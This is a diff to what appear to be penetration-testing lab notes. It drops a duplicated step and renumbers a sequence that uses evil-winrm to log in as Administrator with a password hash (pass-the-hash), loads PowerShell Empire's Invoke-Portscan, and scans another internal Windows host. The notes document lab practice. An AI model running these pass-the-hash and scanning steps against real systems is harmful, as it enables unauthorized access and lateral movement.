@@ -59,25 +59,20 @@ The full command would then look like this (using the top 50 ports and our examp
 $ ls -la /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network
 ```
 
-2. Connect to git-server using Admin hash `-s` for sharing local directory.
-#Attacking_Machine 
-```
-$ ls -la /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network
-```
 
-3. Sign in as the Administrator using the password hash. 
+2. Sign in as the Administrator using the password hash. 
 #Attacking_Machine 
 ```
 $ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network
 ```
 
-4. Run powershell-empire script in evil-winrm shell. 
+3. Run powershell-empire script in evil-winrm shell. 
 #Evil-WinRM_shell 
 ```
 Invoke-Portscan.ps1
 ```
 
-5. Scan the other Windows machine. 
+4. Scan the other Windows machine. 
 #Evil-WinRM_shell 
 ```
 Invoke-Portscan -Hosts 10.200.84.100 -TopPorts 50
